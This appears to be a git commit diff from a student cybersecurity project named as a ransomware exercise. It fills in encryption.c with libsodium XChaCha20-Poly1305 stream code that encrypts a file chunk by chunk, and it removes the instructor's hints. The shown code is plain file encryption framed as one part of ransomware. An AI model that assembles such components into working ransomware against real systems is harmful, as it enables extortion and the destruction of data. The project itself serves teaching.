65d50b11815ff5fcb7a8a708027ca90a3f3991f6
Clara Martin-Rosset <clara.martin-rosset@epitech.eu>
2025-11-13 19:45:45 +0100

    <ENCRyprtion

--- sources/encryption.c
+++ sources/encryption.c
@@ -1,37 +1,67 @@
+/*
+** EPITECH PROJECT, 2025
+** cyber-ransomware-claeuhra
+** File description:
+** encryption.c
+*/
+
 #include "ransom.h"
 #include <sodium/crypto_secretstream_xchacha20poly1305.h>
 #include <sodium/utils.h>
 #include <stdio.h>
 #include <stdlib.h>
 
-/*
-** Here, you have to open both files with different permissions : think of what you want to
-** to do with each file. Don't forget to check the return values of your syscalls !
-*/
 bool init_encryption(FILE **to_encrypt, FILE **encrypted,
     const char *filepath, const char *optfilepath)
 {
     // step 2
+    if (!(*to_encrypt = fopen(filepath, "rb"))
+            || !(*encrypted = fopen(optfilepath, "wb"))) {
+        perror("fopen");
+        return EXIT_FAILURE;
+    }
+    return EXIT_SUCCESS;
 }
 
-/*
-** I strongly advise to code near the sources/decryption.c code : it is the opposite process.
-** Here, you have to initialize the header, then write it in the encrypted file.
-*/
 int write_header(unsigned char *generated_key, FILE **to_encrypt,
     FILE **encrypted, crypto_secretstream_xchacha20poly1305_state *st)
 {
     // step 2
+    unsigned char header[crypto_secretstream_xchacha20poly1305_HEADERBYTES];
+
+    if (crypto_secretstream_xchacha20poly1305_init_push(st, header, generated_key)
+        || fwrite(header, 1, sizeof(header), *encrypted) != sizeof(header)) {
+        perror("Failed to write header");
+        return graceful_exit(*to_encrypt, *encrypted, generated_key, EXIT_FAILURE);
+    }
+
+    return EXIT_SUCCESS;
 }
 
-/*
-** The encryption loop really looks the same than the decryption one.
-** In decryption_loop, the crypto_secretstream_xchacha20poly1305_pull is used to retrieve data.
-** Think of the opposite of "pull" things... The link provided in the README.md about libsodium
-** should really help you.
-*/
 int encryption_loop(FILE *to_encrypt, FILE *encrypted,
     crypto_secretstream_xchacha20poly1305_state st)
 {
     // step 2
+    unsigned char in[CHUNK_SIZE];
+    unsigned char out[CHUNK_SIZE + crypto_secretstream_xchacha20poly1305_ABYTES];
+    unsigned long long opt_len = 0;
+    size_t read_len = 0;
+    int eof = 0;
+    unsigned char tag = 0;
+
+    do {
+        read_len = fread(in, 1, sizeof(in), to_encrypt);
+        eof = feof(to_encrypt);
+        tag = eof ? crypto_secretstream_xchacha20poly1305_TAG_FINAL : 0;
+
+        if (crypto_secretstream_xchacha20poly1305_push(&st, out, &opt_len, in,
+            read_len, NULL, 0, tag)) {
+            perror("Corrupted chunk encountered.");
+            return EXIT_FAILURE;
+        }
+        else fwrite(out, 1, (size_t) opt_len, encrypted);
+
+    } while (!eof);
+    return EXIT_SUCCESS;
 }
+
